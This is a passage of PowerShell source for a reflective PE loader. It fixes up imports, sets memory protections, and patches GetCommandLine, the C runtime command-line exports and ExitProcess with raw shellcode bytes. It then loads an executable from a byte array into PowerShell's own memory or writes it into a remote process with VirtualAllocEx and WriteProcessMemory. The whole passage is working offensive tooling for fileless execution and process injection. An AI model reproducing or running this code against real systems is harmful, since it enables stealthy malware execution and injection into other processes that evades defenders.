                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################
        
        
        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################
        
        
        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        
        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            Write-Verbose "ExitThreadAddr: $ExitThreadAddr"
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }
    
    
    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }

        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }       
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
        
        
        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
